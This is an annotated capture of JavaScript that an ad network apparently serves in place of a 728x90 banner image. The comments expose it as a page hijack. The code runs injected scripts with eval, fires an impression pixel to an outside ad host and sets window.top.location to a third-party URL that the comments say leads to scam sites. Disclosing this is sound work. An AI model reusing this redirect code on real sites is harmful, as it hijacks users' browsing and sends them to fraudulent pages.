// Adsterra "redirect creative" — served through a standard 728x90 banner placement
// This is the ACTUAL code Adsterra delivers instead of a banner image.
// Captured from a live 728x90 display placement.
// Personal identifiers (ad keys, placement IDs, session tokens) have been redacted.

(function() {
  var template = "\
    frame_width=728;frame_height=90; <script type='text/javascript'>
    var dfc221c35e = Number('');
</script>
<script>
    var impressionSession = '[REDACTED_SESSION_TOKEN]';
    var adsHost = 'realizationnewestfangs.com';
    var url = 'https://frs2c.com/link2?browser=Chrome&geo=KR&os=Linux&osversion=Unknown&var=[REDACTED]&var_3=[REDACTED]&ymid=[REDACTED]&z=[REDACTED]';
    var impr = () => {
        new Image().src = 'https://' + adsHost + '/impr.gif?sid=' + impressionSession;
    }
    ;
    var doBanner = () => {
        window.top.ls0s9d8fs9df80 = 'no_r';
        impr();
        window.top.location = url;       // <--- THIS IS THE PAGE HIJACK
    }
    ;
    if (window.top.ls0s9d8fs9df80 !== 'no_r') {
        if (typeof dfc221c35e !== 'undefined') {
            if (!isNaN(dfc221c35e) && dfc221c35e > 0) {
                setTimeout(function() {
                    doBanner();
                }, dfc221c35e * 1000);
            } else {
                doBanner();
            }
        } else {
            impr();
        }
    }
</script>
\
  ";

  // Template injection into the page
  if (typeof atAsyncContainers === 'object' && atAsyncContainers['[REDACTED_KEY]']) {
    var container, scripts;
    if (container = document.getElementById(atAsyncContainers['[REDACTED_KEY]'])) {
      container.innerHTML = template;
      scripts = container.getElementsByTagName('script');
      for (var i = 0; i < scripts.length; i++) {
        if (!!scripts[i].src) {
          (function(raw) {
            var script = document.createElement('script');
            for (var j = 0, length = raw.attributes.length; j < length; j++) {
              script[raw.attributes[j]['name']] = raw.attributes[j]['value'];
            }
            raw.parentNode.replaceChild(script, raw);
          })(scripts[i]);
        } else {
          eval(scripts[i].innerHTML);
        }
      }
    }
  }
})();

// SUMMARY:
// - This was served through a BANNER placement (728x90)
// - There is ZERO visible HTML — no <img>, no <a>, nothing the user can see
// - It fires impr.gif (Adsterra gets paid for the "impression")
// - Then it executes: window.top.location = url
// - This navigates the user's ENTIRE PAGE to a third-party ad URL
// - The user was watching content. Now they're on a casino/crypto scam site.
// - This is what Adsterra calls a "banner ad."
